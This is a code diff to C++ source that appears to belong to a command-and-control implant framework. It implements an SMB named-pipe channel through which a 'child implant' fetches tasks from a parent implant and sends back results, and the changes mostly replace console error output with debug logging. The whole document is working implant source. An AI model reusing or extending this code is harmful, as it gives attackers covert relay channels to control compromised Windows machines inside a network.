@@ -43,6 +43,7 @@ namespace SMB {
         out_buffer.clear();
 
         while (true) {
+            DEBUG_LOG("[SMB::read_pipe_dynamic]: Reading " << CHUNK_SIZE << " bytes from pipe");
             BOOL success = ReadFile(h_pipe, chunk.data(), CHUNK_SIZE, &bytes_read, NULL);
             DWORD err = GetLastError();
 
@@ -53,6 +54,7 @@ namespace SMB {
 
             if (success) {
                 // ReadFile returned TRUE. The entire message has been read.
+                DEBUG_LOG("[SMB::read_pipe_dynamic]: Transfer Complete");
                 break;
             }
 
@@ -62,6 +64,7 @@ namespace SMB {
             }
 
             // If any other error occurs (like ERROR_BROKEN_PIPE), bail out
+            DEBUG_LOG("[SMB::read_pipe_dynamic] Error occured: "<< err);
             return err;
         }
 
@@ -75,22 +78,25 @@ namespace SMB {
     */
     namespace Child {
         bool await_client_connection(HANDLE h_pipe, const std::string& pipe_name) {
-            DEBUG_LOG("[*] Waiting for parent to connect to " << pipe_name << " pipe...");
+            DEBUG_LOG("[SMB::Child::await_client_connection]: Waiting for parent to connect to " << pipe_name << " pipe...");
 
             // Synchronous block. It halts the thread here until the parent connects.
             BOOL connected = ConnectNamedPipe(h_pipe, NULL);
 
             if (!connected && GetLastError() != ERROR_PIPE_CONNECTED) {
-                std::cerr << "[-] ConnectNamedPipe failed: " << GetLastError() << std::endl;
+                //std::cerr << "ConnectNamedPipe failed: " << GetLastError() << std::endl;
+                DEBUG_LOG("[SMB::Child::await_client_connection]: Connecting to pipe failed: " << GetLastError());
                 return false;
             }
 
-            DEBUG_LOG("[+] Parent connected to " << pipe_name << "!");
+            DEBUG_LOG("[SMB::Child::await_client_connection]: Parent connected to " << pipe_name << "!");
             return true;
         }
 
         int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe) {
             std::wstring wstr_pipe_inbox = L"\\\\.\\pipe\\inbox2";
+
+            DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
 
             // STRIPPED: FILE_FLAG_OVERLAPPED
             h_inbox_pipe = CreateNamedPipeW(
@@ -100,9 +106,15 @@ namespace SMB {
                 1, 4096, 4096, 0, NULL
             );
 
-            if (h_inbox_pipe == INVALID_HANDLE_VALUE) return 1;
+            if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
+                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << GetLastError());
+                return 1;
+            }
+            DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registered successfully: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
 
             std::wstring wstr_pipe_outbox = L"\\\\.\\pipe\\outbox2";
+
+            DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()));
 
             // STRIPPED: FILE_FLAG_OVERLAPPED
             h_outbox_pipe = CreateNamedPipeW(
@@ -112,7 +124,10 @@ namespace SMB {
                 1, 4096, 4096, 0, NULL
             );
 
-            if (h_outbox_pipe == INVALID_HANDLE_VALUE) return 1;
+            if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
+                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << GetLastError());
+                return 1;
+            }
 
             // Await connection for both pipes
             if (!await_client_connection(h_inbox_pipe, "INBOX")) return 1;
@@ -123,10 +138,10 @@ namespace SMB {
     
         std::vector<uint8_t> fetch_tasks(HANDLE h_inbox, HANDLE h_outbox, const std::vector<uint8_t>& get_request_payload) {
             DWORD bytes_written = 0;
-
+            DEBUG_LOG("[SMB::Child::fetch_tasks]: Fetching Tasks");
             // Write the GET request up to the Parent
             if (!WriteFile(h_outbox, get_request_payload.data(), static_cast<DWORD>(get_request_payload.size()), &bytes_written, NULL)) {
-                std::cerr << "[-] SMB::Child Write Error: " << GetLastError() << std::endl;
+                DEBUG_LOG("[SMB::Child::fetch_tasks]: Write Error: " << GetLastError());
                 return {};
             }
 
@@ -135,24 +150,27 @@ namespace SMB {
             DWORD read_status = read_pipe_dynamic(h_inbox, inbound_buffer);
 
             if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
+                DEBUG_LOG("[SMB::Child::fetch_tasks]: Retrieved data from parent");
                 return inbound_buffer;
             }
 
+            DEBUG_LOG("[SMB::Child::fetch_tasks]: No data from parent, inbound buffer was empty, or a failed read");
             return {};
         }
 
         bool send_data(HANDLE h_outbox, const std::vector<uint8_t>& payload) {
             if (payload.empty() || h_outbox == INVALID_HANDLE_VALUE) {
+                DEBUG_LOG("[SMB::Child::send_data]: Payload empty or outbox handle is invalid: " << GetLastError());
                 return false;
             }
 
             DWORD bytes_written = 0;
             if (!WriteFile(h_outbox, payload.data(), static_cast<DWORD>(payload.size()), &bytes_written, NULL)) {
-                std::cerr << "[-] SMB::Child Immediate pipe write error: " << GetLastError() << std::endl;
+                DEBUG_LOG("[SMB::Child::send_data]: Immediate pipe write error: " << GetLastError());
                 return false;
             }
 
-            DEBUG_LOG("[+] Instantly sent " << bytes_written << " bytes to parent.");
+            DEBUG_LOG("[SMB::Child::send_data]: Instantly sent " << bytes_written << " bytes to parent.");
             return true;
         }
 
@@ -176,6 +194,7 @@ namespace SMB {
              3. gets the response from the child in the outbox pipe.
                 > Pushes result to POST queue
             */
+            DEBUG_LOG("[SMB::Parent::cycle_child]: Interacting with child implant");
 
             std::vector<uint8_t> inbound_buffer;
 
@@ -188,13 +207,14 @@ namespace SMB {
                     GetQueue::push(get_from_child);
                 }
                 catch (const std::exception& e) {
-                    std::cerr << "[-] MsgPack unpack failed on child check-in: " << e.what() << std::endl;
+                    DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on child check-in: " << e.what());
                     return nlohmann::json{};
                 }
             }
             else {
                 // read_pipe_dynamic returns the exact error code now, no need for GetLastError()
-                std::cerr << "[-] ReadFile failed on child check-in. Error: " << read_status << std::endl;
+                DEBUG_LOG("ReadFile failed on child check-in. Error: " << read_status);
+
                 return nlohmann::json{};
             }
 
@@ -207,13 +227,13 @@ namespace SMB {
                 msgpack_payload = nlohmann::json::to_msgpack(task_list);
             }
             catch (const std::exception& e) {
-                std::cerr << "[-] MsgPack pack failed on task serialization: " << e.what() << std::endl;
+                DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on task serialization: " << e.what());
                 return nlohmann::json{};
             }
 
             DWORD bytes_written = 0;
             if (!WriteFile(h_write, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL)) {
-                std::cerr << "[-] WriteFile failed sending task to child. Error: " << GetLastError() << std::endl;
+                DEBUG_LOG("[SMB::Parent::cycle_child]: WriteFile failed sending task to child. Error: " << GetLastError());
                 return nlohmann::json{};
             }
 
@@ -230,12 +250,12 @@ namespace SMB {
                     return nlohmann::json::from_msgpack(inbound_buffer);
                 }
                 catch (const std::exception& e) {
-                    std::cerr << "[-] MsgPack unpack failed on task response: " << e.what() << std::endl;
+                    DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on task response" << e.what());
                     return nlohmann::json{};
                 }
             }
             else {
-                std::cerr << "[-] ReadFile failed on task response. Error: " << read_status << std::endl;
+                DEBUG_LOG("[SMB::Parent::cycle_child]: ReadFile failed on task response. Error: " << read_status);
                 return nlohmann::json{};
             }
         }
